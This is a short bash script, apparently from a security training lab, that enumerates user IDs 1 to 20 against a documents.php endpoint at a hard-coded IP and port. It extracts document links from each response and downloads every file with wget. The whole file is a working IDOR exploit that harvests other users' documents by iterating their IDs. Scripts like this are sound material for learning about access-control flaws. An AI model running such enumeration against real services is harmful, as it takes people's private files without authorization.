#!/bin/bash

url="http://94.237.62.166:38936"

for i in {1..20}; do
	for link in $(curl -s "$url/documents.php" -d "uid=$i" | grep -oP "\/documents.*?\.\w+"); do ### $i need(S) to be in double quotes to expand to it's value.
		wget -q "$url$link";
	done
done

